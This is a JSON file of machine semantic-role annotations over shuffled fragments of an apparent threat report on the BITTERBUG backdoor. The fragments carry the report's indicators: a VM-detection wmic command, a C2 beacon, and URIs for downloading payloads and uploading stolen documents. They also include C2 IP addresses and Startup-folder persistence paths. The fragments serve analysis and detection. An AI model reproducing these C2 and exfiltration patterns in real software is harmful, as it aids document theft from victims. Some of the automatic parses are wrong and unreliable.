lure which contained a decoy document related to Pakistan's alleged inability to locate Osama Bin Laden": {"led": {"ARG0": {"text": "The debug path of \" umairaziz27 \""}, "V": {"text": "led", "index": 7}, "ARG1": {"text": "us"}, "ARG2": {"text": "to Twitter One of these samples was probably used in attacks in late summer 2013 , using a \" leaked report \" lure which contained a decoy document related to Pakistan 's alleged inability to locate Osama Bin Laden"}}, "was": {"V": {"text": "was", "index": 15}}, "used": {"ARG1": {"text": "One of these samples"}, "ARGM-ADV": {"text": "probably"}, "V": {"text": "used", "index": 17}, "ARG2": {"text": "in attacks/ using a \" leaked report \" lure which contained a decoy document related to Pakistan 's alleged inability to locate Osama Bin Laden"}, "ARGM-TMP": {"text": "in late summer 2013"}}, "using": {"V": {"text": "using", "index": 25}, "ARG1": {"text": "a \" leaked report \" lure which contained a decoy document related to Pakistan 's alleged inability to locate Osama Bin Laden"}}, "leaked": {"V": {"text": "leaked", "index": 28}, "ARG1": {"text": "report"}}, "contained": {"ARG0": {"text": "a \" leaked report \" lure"}, "R-ARG0": {"text": "which"}, "V": {"text": "contained", "index": 33}, "ARG1": {"text": "a decoy document related to Pakistan 's alleged inability to locate Osama Bin Laden"}}, "related": {"ARG1": {"text": "a decoy document"}, "V": {"text": "related", "index": 37}, "ARG2": {"text": "to Pakistan 's alleged inability to locate Osama Bin Laden"}}, "locate": {"V": {"text": "locate", "index": 44}, "ARG1": {"text": "Osama Bin Laden"}}}, " Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed\npart of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and\norigins (behind U.S": {"suggest": {"ARG0": {"text": "Many of the notable characteristics of the BITTERBUG activity"}, "V": {"text": "suggest", "index": 9}, "ARG1": {"text": "that this is indeed part of a Pakistan - based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and origins ( behind U.S"}}, "is": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 12}, "ARGM-ADV": {"text": "indeed"}, "ARG2": {"text": "part of a Pakistan - based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and origins ( behind U.S"}}, "based": {"ARG0": {"text": "Pakistan"}, "V": {"text": "based", "index": 19}, "ARG1": {"text": "cyber exploitation effort"}}, "has": {"V": {"text": "has", "index": 24}}, "attempted": {"ARG0": {"text": "a Pakistan - based cyber exploitation effort"}, "R-ARG0": {"text": "that"}, "ARGM-ADV": {"text": "apparently"}, "V": {"text": "attempted", "index": 26}, "ARG1": {"text": "to obfuscate its malware characteristics and origins ( behind U.S"}}, "obfuscate": {"ARG0": {"text": "that"}, "V": {"text": "obfuscate", "index": 28}, "ARG1": {"text": "its malware characteristics"}}}, "\n\n\n<figure>\n               POST /path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%> HTTP/1.1\n               Host: <c2_location>\n               Accept: */*\n               Content-Length: 25\n               Content-Type: application/x-www-form-urlencoded\n               <%COMPUTERNAME%>_<%USERNAME%>\n</figure>\n                 <caption>                        Figure 14: Initial C2 beacon</caption>\n\n\n\n\n<footer>13  \u2022     OPERATION ARACHNOPHOBIA</footer>\n\fBITTERBUG then may perform an HTTP GET request for the following URI:\n<list>\nhttp://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n</list>\nIf the C2 server responds with a filename, the filename received is deleted from %APPDATA%\\Microsoft<FILE_NAME_FROM_\nC2>": {}, " To our knowledge this customized malware\nhas only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.43<fn>1</fn> and\n199.91.173.45.<fn>2</fn> <fn>3</fn> According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,\nMissouri": {"customized": {"V": {"text": "customized", "index": 4}, "ARG1": {"text": "malware"}}, "has": {"V": {"text": "has", "index": 6}}, "been": {"V": {"text": "been", "index": 9}}, "observed": {"ARGM-ADV": {"text": "To our knowledge"}, "ARG1": {"text": "this customized malware"}, "ARGM-TMP": {"text": "only ever"}, "V": {"text": "observed", "index": 10}, "ARGM-PRD": {"text": "hosted on and communicating with two command and control nodes/ 199.91.173.43"}}, "hosted": {"ARG1": {"text": "this customized malware"}, "V": {"text": "hosted", "index": 11}, "ARGM-LOC": {"text": "on and communicating"}}, "communicating": {"ARGM-ADV": {"text": "To our knowledge"}, "ARG0": {"text": "this customized malware"}, "ARGM-TMP": {"text": "only ever"}, "V": {"text": "communicating", "index": 14}, "ARGM-MNR": {"text": "with two command and control nodes"}}, "According": {"V": {"text": "According", "index": 23}}, "were": {"V": {"text": "were", "index": 31}}, "registered": {"ARGM-ADV": {"text": "199.91.173.43/ According to Whois records"}, "ARG1": {"text": "those IP addresses"}, "V": {"text": "registered", "index": 32}, "ARG2": {"text": "to a web - hosting firm in Kansas City ,"}}, "hosting": {"ARG1": {"text": "web"}, "V": {"text": "hosting", "index": 37}, "ARG0": {"text": "firm"}, "ARGM-LOC": {"text": "in Kansas City"}}}, "\n</section>\n<section>\n<heading>Inconsistency #5: Similar Document Metadata Properties</heading>\nAnalysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations,\nReport.docx<fn>58</fn> and Naxalites_Funded_by_Pakistan.docx<fn>59</fn>, both maintained the author properties of \u201chp\u201d": {"maintained": {"ARG0": {"text": "both"}, "V": {"text": "maintained", "index": 2}, "ARG1": {"text": "the author properties of \u201c hp \u201d"}}}, "\n\n\n<figure></figure>\n\n            <caption>       Figure 13: Example recovery.txt file from VMware virtual machine</caption>\n\n\nNext BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised\nsystem": {"will": {"ARG0": {"text": "Next BITTERBUG"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "will", "index": 3}, "ARG1": {"text": "beacon"}, "ARG2": {"text": "to the C2 server"}, "ARGM-MNR": {"text": "by sending the computer name and username of the compromised system"}}, "beacon": {"ARG0": {"text": "Next BITTERBUG"}, "ARGM-ADV": {"text": "typically"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "beacon", "index": 4}, "ARG2": {"text": "to the C2 server"}, "ARGM-MNR": {"text": "by sending the computer name and username of the compromised system"}}, "sending": {"ARG0": {"text": "Next BITTERBUG"}, "V": {"text": "sending", "index": 10}, "ARG1": {"text": "the computer name and username of the compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 18}, "ARG1": {"text": "system"}}}, "\n\n\n<figure></figure>\n\n                 <caption>   Timeline of BITTERBUG characteristics vs.ThreatConnect events</caption>\n</section>\n\n\n\n<footer>12  \u2022     OPERATION ARACHNOPHOBIA</footer>\n\n\f\n<section>\n<heading>Details</heading>\nUpon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:\n<list>\n\u2022\t libcurld.dll \u2013 Used for downloading and uploading files\n\n\u2022\t msvcm90d.dll \u2013 C runtime library\n\n\u2022\t msvcp90d.dll \u2013 C runtime library\n\n\u2022\t msvcr90d.dll \u2013 C runtime library\n</list>\nThe self-extracting RAR may install the following benign configuration files:\n<list>\n\u2022\t Microsoft.VC90.DebugCRT.manifest \u2013 Compilation artifact\n\n\u2022\t BtcirEt.DZU \u2013 Self-extracting RAR configuration file\n\n\u2022\t SJeXSrA.KNX \u2013 Self-extracting RAR configuration file\n\n\u2022\t VCAKSQl.TNT \u2013 Self-extracting RAR configuration file\n</list>\nBITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a\nvirtual machine (VM):\n<list>\n\u2022\t cmd.exe /c wmic diskdrive list brief >\n  \u201c%APPDATA%\\Microsoft\\recovery.txt\u201d\n</list>\nBITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware": {"may": {"ARG0": {"text": "BITTERBUG"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "may", "index": 2}, "ARG1": {"text": "open recovery.txt"}}, "open": {"ARG0": {"text": "BITTERBUG"}, "ARGM-TMP": {"text": "then"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "open", "index": 3}, "ARG1": {"text": "recovery.txt"}}, "check": {"ARG0": {"text": "BITTERBUG"}, "ARGM-TMP": {"text": "then"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "check", "index": 6}, "ARG1": {"text": "for the presence of strings VBox or VMware"}}}, "\n\n<table>\n                           Request URI                                                    Download Path\n\n      http://<c2_location>/versionchk.php?srs=436712384                            %APPDATA%\\Microsoft\\file.exe\n\n           http://<c2_location>/vtris.php?srs=436712384                         %APPDATA%\\Microsoft\\percf001.dat\n\n          http://<c2_location>/vtris1.php?srs=436712384                         %APPDATA%\\Microsoft\\percf002.dat\n\n      http://<c2_location>/is_array_max.php?compname=                         %USERPROFILE%\\Start Menu\\Programs\\\n           <%COMPUTERNAME%>_<%USERNAME%>                                                Startup\\wincheck.exe\n\n         http://<c2_location>/is_array_pal.php?compname=                      %USERPROFILE%\\Start Menu\\Programs\\\n           <%COMPUTERNAME%>_<%USERNAME%>                                                 Startup\\winsquirt.exe\n</table>\n       <caption>                       Table 1: Files downloaded by the backdoor</caption>\n\n\nNext, BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions: \n<list>\n.doc, .ppt, .xls, .pdf, .docx, .pptx, .pps, .xlsx\n</list>\nBITTERBUG then typically creates a file list containing all documents (excluding those whose filename contains MediaUtils) to\nthe following locations:\n<list>\n\u2022\t %APPDATA%\\Microsoft\\plang006.txt\n\u2022\t %APPDATA%\\Microsoft\\tlang006.txt\n</list>\nBITTERBUG may also write a list of all running processes to:\n<list>\n\u2022\t %APPDATA%\\Microsoft\\prc.dat\n</list>\nFinally, BITTERBUG typically uploads the running process list, document file list, and all documents to the following URI:\n<list>\n\u2022\t http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n</list>\n</section>\n<section>\n<heading>Host-Based Signatures</heading>\n</section>\n<section>\n<heading>File System Residue</heading>\n\nBITTERBUG may be extracted along with the following embedded files:\n<list>\n\u2022\t %USERPROFILE%\\5rv3fgk6\\<BITTERBUG>.exe\n\u2022\t %USERPROFILE%\\5rv3fgk6\\libcurld.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\msvcm90d.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\msvcp90d.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\msvcr90d.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\Microsoft.VC90.DebugCRT.manifest\n\n\n\n\n<footer>14  \u2022     OPERATION ARACHNOPHOBIA</footer>\n\f\u2022\t %USERPROFILE%\\5rv3fgk6\\SJeXSrA.KNX\n\u2022\t %USERPROFILE%\\5rv3fgk6\\BtcirEt.DZU\n\u2022\t %USERPROFILE%\\5rv3fgk6\\VCAKSQl.TNT\n</list>\nThe malware may create the following files:\n<list>\n\u2022\t %APPDATA%\\Microsoft\\recovery.txt\n\u2022\t %APPDATA%\\Microsoft\\plang006.txt\n\u2022\t %APPDATA%\\Microsoft\\tlang006.txt\n\u2022\t %APPDATA%\\Microsoft\\prc.dat\n\u2022\t %APPDATA%\\Microsoft\\file.exe\n\u2022\t %APPDATA%\\Microsoft\\percf001.dat\n\u2022\t %APPDATA%\\Microsoft\\percf002.dat\n\u2022\t %USERPROFILE%\\Start Menu\\Programs\\Startupwincheck.exe\n\u2022\t %USERPROFILE%\\Start Menu\\Programs\\Startup\\winsquirt.exe\n</list>\n</section>\n<section>\n<heading>Network-Based Signatures</heading>\n\u2022\t The malware typically communicates on TCP port 80:\n\n\u2022\t The malware may perform HTTP requests for the following URIs:\n<list>\n     \u2022\t http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/is_array_max.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/is_array_pal.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/versionchk.php?srs=436712384\n     \u2022\t http://<c2_location>/vtris.php?srs=436712384\n     \u2022\t http://<c2_location>/vtris1.php?srs=436712384\n</list>\n</section>\n<section>\n<heading>File Manipulations</heading>\nWe observed other interesting operational security-oriented challenges in the post-blog post samples": {"observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 1}, "ARG1": {"text": "other interesting operational security - oriented challenges in the post - blog post samples"}}, "oriented": {"ARG0": {"text": "operational"}, "ARG1": {"text": "security/ challenges"}, "V": {"text": "oriented", "index": 7}}}, "\n\n\u2022\t The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S": {"utilized": {"ARG0": {"text": "The threat actors"}, "V": {"text": "utilized", "index": 4}, "C-ARG1": {"text": "a hosting provider that is a Pakistani - based company with subleased VPS space within the U.S"}}, "is": {"ARG1": {"text": "a hosting provider"}, "R-ARG1": {"text": "that"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "a Pakistani - based company"}}, "based": {"ARG2": {"text": "Pakistani"}, "V": {"text": "based", "index": 13}, "ARG1": {"text": "company"}}}, " The final two\nfiles are downloaded to the user\u2019s Startup directory and executed at startup in order to maintain persistence": {"are": {"V": {"text": "are", "index": 4}}, "downloaded": {"ARG1": {"text": "The final two files"}, "V": {"text": "downloaded", "index": 5}, "ARG2": {"text": "to the user \u2019s Startup directory"}, "ARGM-PRP": {"text": "order/ to maintain persistence"}}, "executed": {"ARG0": {"text": "The final two files"}, "V": {"text": "executed", "index": 13}, "ARGM-LOC": {"text": "at startup"}, "ARGM-PRP": {"text": "in order to maintain persistence"}}, "maintain": {"ARG0": {"text": "The final two files"}, "V": {"text": "maintain", "index": 19}, "ARG1": {"text": "persistence"}}}, " Connections to its C2 nodes relied on\nPHP and used communications that included \u201c.php?compname=\u201d and \u201c.php?srs=\u201d, as well as direct file/component retrieval\nfrom the C2s": {"relied": {"ARG0": {"text": "Connections to its C2 nodes"}, "V": {"text": "relied", "index": 5}, "ARG1": {"text": "on PHP"}}, "used": {"ARG0": {"text": "Connections to its C2 nodes"}, "V": {"text": "used", "index": 9}, "ARG1": {"text": "communications that included \u201c"}}, "included": {"ARG2": {"text": "PHP and used communications"}, "R-ARG2": {"text": "that"}, "V": {"text": "included", "index": 12}, "ARG1": {"text": "\u201c"}}}, " We have observed BITTERBUG installed by a self-extracting RAR archive\ndisguised as a screensaver": {"have": {"V": {"text": "have", "index": 1}}, "observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "BITTERBUG installed by a self - extracting RAR archive disguised as a screensaver"}}, "installed": {"ARG1": {"text": "BITTERBUG"}, "V": {"text": "installed", "index": 4}, "ARG2": {"text": "by a self - extracting RAR archive disguised as a screensaver"}}, "extracting": {"ARGM-MNR": {"text": "self"}, "V": {"text": "extracting", "index": 9}, "ARG1": {"text": "RAR archive"}}, "disguised": {"ARG1": {"text": "a self - extracting RAR archive"}, "V": {"text": "disguised", "index": 12}, "ARG2": {"text": "as a screensaver"}}}, "\n\n<figure></figure>\n<caption>Figure 11: Generic Debug Path</caption>\n\nBetween December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR) files": {"observed": {"ARGM-TMP": {"text": "Between December 2013 and late March 2014"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 9}, "ARG1": {"text": "several new lures used in BITTERBUG self - extracting RAR ( SFXRAR ) files"}}, "used": {"ARG1": {"text": "several new lures"}, "V": {"text": "used", "index": 13}, "ARGM-LOC": {"text": "in BITTERBUG self"}, "ARG2": {"text": "- extracting RAR ( SFXRAR ) files"}}, "extracting": {"V": {"text": "extracting", "index": 18}, "ARG0": {"text": "RAR"}}}, " The threat actor appears to\nhave exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S": {"appears": {"ARG1": {"text": "The threat actor"}, "V": {"text": "appears", "index": 3}, "C-ARG1": {"text": "to have exclusively used VPSNOC , a probable Pakistan - based VPS service provider who leased U.S"}}, "have": {"ARG0": {"text": "The threat actor"}, "V": {"text": "have", "index": 5}, "ARG1": {"text": "exclusively used VPSNOC , a probable Pakistan - based VPS service provider who leased U.S"}}, "used": {"ARG0": {"text": "The threat actor"}, "ARGM-MNR": {"text": "exclusively"}, "V": {"text": "used", "index": 7}, "ARG1": {"text": "VPSNOC , a probable Pakistan - based VPS service provider who leased U.S"}}, "based": {"ARGM-LOC": {"text": "Pakistan"}, "V": {"text": "based", "index": 14}, "ARG1": {"text": "VPS service provider"}}, "leased": {"ARG0": {"text": "a probable Pakistan - based VPS service provider"}, "R-ARG0": {"text": "who"}, "V": {"text": "leased", "index": 19}, "ARG1": {"text": "U.S"}}}, " The backdoor then may\nenter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13)": {"may": {"ARG0": {"text": "The backdoor"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "may", "index": 3}, "C-ARG1": {"text": "enter"}, "ARG1": {"text": "an infinite sleep loop"}, "ARGM-ADV": {"text": "if recovery.txt contains either one of the aforementioned strings ( Example in Figure 13 )"}}, "enter": {"ARG0": {"text": "The backdoor"}, "ARGM-TMP": {"text": "then"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "enter", "index": 4}, "ARG1": {"text": "an infinite sleep loop"}, "ARGM-ADV": {"text": "if recovery.txt contains either one of the aforementioned strings ( Example in Figure 13 )"}}, "contains": {"ARG0": {"text": "recovery.txt"}, "V": {"text": "contains", "index": 11}, "ARG1": {"text": "either one of the aforementioned strings ( Example in Figure 13 )"}}}, "\n\n\u2022\t The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with\n    two IP addresses operated by a Pakistan-based hosting provider": {"used": {"ARG1": {"text": "The customized malware ( BITTERBUG )"}, "V": {"text": "used", "index": 7}, "ARG0": {"text": "by these threat actors"}}, "has": {"V": {"text": "has", "index": 12}}, "been": {"V": {"text": "been", "index": 14}}, "observed": {"ARG1": {"text": "\u2022 The customized malware ( BITTERBUG ) used by these threat actors"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "observed", "index": 15}, "ARGM-PRD": {"text": "hosted on and communicating/ with two IP addresses operated by a Pakistan - based hosting provider"}}, "hosted": {"ARG1": {"text": "\u2022 The customized malware ( BITTERBUG ) used by these threat actors"}, "V": {"text": "hosted", "index": 16}, "ARGM-ADV": {"text": "with two IP addresses operated by a Pakistan - based hosting provider"}}, "communicating": {"ARG0": {"text": "\u2022 The customized malware ( BITTERBUG ) used by these threat actors"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "communicating", "index": 19}, "ARGM-MNR": {"text": "with two IP addresses operated by a Pakistan - based hosting provider"}}, "operated": {"ARG1": {"text": "two IP addresses"}, "V": {"text": "operated", "index": 24}, "ARG0": {"text": "by a Pakistan - based hosting provider"}}, "based": {"ARG0": {"text": "Pakistan"}, "V": {"text": "based", "index": 29}, "ARG1": {"text": "hosting provider"}}}, " BITTERBUG appears to be virtual machine aware\nand may not execute on a VMWare or VirtualBox VM": {"appears": {"ARG1": {"text": "BITTERBUG"}, "V": {"text": "appears", "index": 1}, "C-ARG1": {"text": "to be virtual machine aware"}}, "be": {"ARG1": {"text": "BITTERBUG"}, "V": {"text": "be", "index": 3}, "ARG2": {"text": "virtual machine aware"}}, "may": {"V": {"text": "may", "index": 8}}, "execute": {"ARG0": {"text": "BITTERBUG"}, "ARGM-MOD": {"text": "may"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "execute", "index": 10}, "ARGM-ADV": {"text": "on a VMWare or VirtualBox VM"}}}, " FireEye\nanalyzed the malware, which they call BITTERBUG, and determined it to be a custom backdoor": {"analyzed": {"ARG0": {"text": "FireEye"}, "V": {"text": "analyzed", "index": 1}, "ARG1": {"text": "the malware , which they call BITTERBUG"}}, "call": {"ARG1": {"text": "the malware"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "they"}, "V": {"text": "call", "index": 7}, "ARG2": {"text": "BITTERBUG"}}, "determined": {"ARG0": {"text": "FireEye"}, "V": {"text": "determined", "index": 11}, "ARG1": {"text": "it to be a custom backdoor"}}, "be": {"ARG1": {"text": "it"}, "V": {"text": "be", "index": 14}, "ARG2": {"text": "a custom backdoor"}}}, " Interestingly, the samples compiled following the blog publication used entirely new and generic debug paths (Figure 11) as well as a compilation tactic to conceal the C2 address from static analysis": {"compiled": {"ARGM-ADV": {"text": "Interestingly"}, "ARG1": {"text": "the samples"}, "V": {"text": "compiled", "index": 4}, "ARGM-TMP": {"text": "following the blog publication used entirely new and generic debug paths ( Figure 11 ) as well as a compilation tactic to conceal the C2 address from static analysis"}}, "following": {"ARG1": {"text": "the samples compiled"}, "V": {"text": "following", "index": 5}, "ARG2": {"text": "the blog publication used entirely new and generic debug paths ( Figure 11 )"}}, "used": {"ARG0": {"text": "the blog publication"}, "V": {"text": "used", "index": 9}, "ARG1": {"text": "entirely new and generic debug paths ("}, "ARG2": {"text": "to conceal the C2 address from static analysis"}}, "conceal": {"V": {"text": "conceal", "index": 27}, "ARG1": {"text": "the C2 address"}, "ARG2": {"text": "from static analysis"}}}, "\n\n</section>\n\n\n<footer>11    \u2022     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\fAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server": {"is": {"ARG1": {"text": "BITTERBUG"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a backdoor executable capable of uploading and downloading files , listing running processes , generating file listings , and automatically transferring selected files to its command and control ( C2 ) server"}}, "uploading": {"V": {"text": "uploading", "index": 7}, "ARG1": {"text": "files"}}, "downloading": {"V": {"text": "downloading", "index": 9}, "ARG0": {"text": "files"}}, "listing": {"V": {"text": "listing", "index": 12}, "ARG1": {"text": "running processes"}}, "generating": {"V": {"text": "generating", "index": 16}, "ARG1": {"text": "file listings"}}, "transferring": {"ARGM-MNR": {"text": "automatically"}, "V": {"text": "transferring", "index": 22}, "ARG1": {"text": "selected files"}, "ARG2": {"text": "to its command and control ( C2 ) server"}}, "selected": {"V": {"text": "selected", "index": 23}, "ARG1": {"text": "files"}}}, " The backdoor relies on various support components, including the non-malicious, publically available Libcurl<fn>40</fn> for installation, launch, and communications": {"relies": {"ARG0": {"text": "The backdoor"}, "V": {"text": "relies", "index": 2}, "ARG1": {"text": "on various support components , including the non - malicious , publically available Libcurl for installation , launch , and communications"}}, "including": {"ARG2": {"text": "various support components"}, "V": {"text": "including", "index": 8}, "ARG1": {"text": "the non - malicious , publically available Libcurl for installation , launch , and communications"}}}, " Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and\nthe BITTERBUG executable": {"extracting": {"ARGM-MNR": {"text": "self"}, "V": {"text": "extracting", "index": 6}, "ARG1": {"text": "RAR"}}, "may": {"V": {"text": "may", "index": 9}}, "extract": {"ARGM-TMP": {"text": "Upon execution"}, "ARG0": {"text": "the self - extracting RAR archive"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "extract", "index": 10}, "ARG1": {"text": "configuration files , dependency DLLs"}}, "executable": {"ARG0": {"text": "the BITTERBUG"}, "V": {"text": "executable", "index": 20}}}, " One from December contained several BITTERBUG variants and used a decoy PDF document (Figure 12) related to the December arrest of Devyani Khobragade,<fn>47</fn> an Indian diplomat in the United States": {"contained": {"ARG0": {"text": "One from December"}, "V": {"text": "contained", "index": 3}, "ARG1": {"text": "several BITTERBUG variants"}}, "used": {"ARG0": {"text": "One from December"}, "V": {"text": "used", "index": 8}, "ARG1": {"text": "a decoy PDF document ( Figure 12 ) related to the December arrest of Devyani Khobragade , an Indian diplomat in the United States"}}, "related": {"V": {"text": "related", "index": 17}, "ARG2": {"text": "to the December arrest of Devyani Khobragade , an Indian diplomat in the United States"}}}, " In spring 2014, we observed a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysis Airlines Flight 370<fn>48</fn> (cast as a Pakistan-related hijacking)": {"observed": {"ARGM-TMP": {"text": "In spring 2014"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 5}, "ARG1": {"text": "a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysis Airlines Flight 370 ( cast as a Pakistan - related hijacking )"}}, "related": {"ARG1": {"text": "a filename"}, "V": {"text": "related", "index": 13}, "ARG2": {"text": "to the March 2014 disappearance of Malaysis Airlines Flight 370 ( cast as a Pakistan - related hijacking )"}}, "cast": {"ARG1": {"text": "Malaysis Airlines Flight 370 ("}, "V": {"text": "cast", "index": 25}, "ARGM-PRD": {"text": "as a Pakistan - related hijacking )"}}, "related_2": {"ARG2": {"text": "Pakistan"}, "V": {"text": "related", "index": 30}, "ARG1": {"text": "hijacking"}}}, "\n\nThe following is a summary of the relationships between the hosting organizations and Tranchulas:\n\n\u2022\t VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that\n    contained build strings that referenced \u201cTranchulas\u201d and a Tranchulas employee": {"is": {"ARG1": {"text": "The following"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a summary of the relationships between the hosting organizations and Tranchulas"}}, "hosting": {"V": {"text": "hosting", "index": 10}, "ARG0": {"text": "organizations and Tranchulas"}}, "was": {"V": {"text": "was", "index": 19}}, "used": {"ARG1": {"text": "\u2022 VPNSOC IP space"}, "V": {"text": "used", "index": 20}, "ARG2": {"text": "as command and control nodes for attackers"}, "ARGM-ADV": {"text": "using variants of the BITTERBUG malware that contained build strings that referenced \u201c Tranchulas \u201d and a Tranchulas employee"}}, "using": {"V": {"text": "using", "index": 28}, "ARG1": {"text": "variants of the BITTERBUG malware that contained build strings that referenced \u201c Tranchulas \u201d and a Tranchulas employee"}}, "contained": {"ARG0": {"text": "the BITTERBUG malware"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 35}, "ARG1": {"text": "build strings that referenced \u201c Tranchulas \u201d and a Tranchulas employee"}}, "referenced": {"ARG0": {"text": "strings"}, "R-ARG0": {"text": "that"}, "V": {"text": "referenced", "index": 39}, "ARG1": {"text": "\u201c Tranchulas \u201d and a Tranchulas employee"}}}, "\n\n<figure></figure>\n<caption>Figure 12: Screenshot of Indian diplomat arrest decoy PDF</caption>\n\nBITTERBUG continued to rely on the same network behaviors to communicate with its C2s": {"continued": {"ARG0": {"text": "BITTERBUG"}, "V": {"text": "continued", "index": 1}, "ARG1": {"text": "to rely on the same network behaviors to communicate with its C2s"}}, "rely": {"ARG0": {"text": "BITTERBUG"}, "V": {"text": "rely", "index": 3}, "ARG1": {"text": "on the same network behaviors"}, "ARG2": {"text": "to communicate with its C2s"}}, "communicate": {"ARG0": {"text": "BITTERBUG"}, "V": {"text": "communicate", "index": 10}, "ARG2": {"text": "with its C2s"}}}, " In some variants, BITTERBUG has the ability to automatically target and exfiltrate files with extensions such as .doc, .xls, .pdf, .ppt, .egm, and .xml": {"has": {"ARGM-ADV": {"text": "In some variants"}, "ARG0": {"text": "BITTERBUG"}, "V": {"text": "has", "index": 5}, "ARG1": {"text": "the ability to automatically target and exfiltrate files with extensions such as .doc , .xls , .pdf , .ppt , .egm , and .xml"}}, "target": {"ARG0": {"text": "BITTERBUG"}, "ARGM-MNR": {"text": "automatically"}, "V": {"text": "target", "index": 10}, "ARG2": {"text": "with extensions such as .doc , .xls , .pdf , .ppt , .egm , and"}}, "exfiltrate": {"ARGM-MNR": {"text": "automatically"}, "V": {"text": "exfiltrate", "index": 12}, "ARG1": {"text": "files"}, "ARG2": {"text": "with extensions such as .doc , .xls , .pdf , .ppt , .egm , and"}}}, "\n\n<figure>\n                        Decoys associated with BITTERBUG                               Tranchulas Documents\n\n</figure>\n\n\n         <caption>                         Figure 10: Matching Document Author Metadata</caption>\n\n\n<footnote>\n\n39\t       http://www.know-hosting.com/view/27108-digitallinx.html\n</footnote>\n\n\n<footer>8    \u2022     OPERATION ARACHNOPHOBIA</footer>\n\fWhile the author field of \u201chp\u201d doesn\u2019t conclusively prove a relationship, it contributes to the body of circumstantial evidence which\nlinks properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with\nBITTERBUG targeting campaigns": {"does": {"V": {"text": "does", "index": 8}}, "prove": {"ARG0": {"text": "the author field of \u201c hp \u201d"}, "ARGM-NEG": {"text": "n\u2019t"}, "ARGM-MNR": {"text": "conclusively"}, "V": {"text": "prove", "index": 11}, "ARG1": {"text": "a relationship"}}, "contributes": {"ARGM-ADV": {"text": "While the author field of \u201c hp \u201d does n\u2019t conclusively prove a relationship"}, "ARG0": {"text": "it"}, "V": {"text": "contributes", "index": 16}, "ARG2": {"text": "to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns"}}, "links": {"ARG0": {"text": "circumstantial evidence"}, "R-ARG0": {"text": "which"}, "V": {"text": "links", "index": 24}, "ARG1": {"text": "properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns"}}, "were": {"V": {"text": "were", "index": 38}}, "used": {"ARG1": {"text": "decoy documents"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 39}, "ARGM-MNR": {"text": "in conjunction with BITTERBUG targeting campaigns"}}, "targeting": {"ARG0": {"text": "links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG"}, "V": {"text": "targeting", "index": 44}, "ARG1": {"text": "campaigns"}}}, "\n\nBITTERBUG then may attempt to download the files listed in Table 1": {"may": {"ARGM-TMP": {"text": "then"}, "V": {"text": "may", "index": 2}, "ARG1": {"text": "attempt to download the files listed in Table 1"}}, "attempt": {"ARG0": 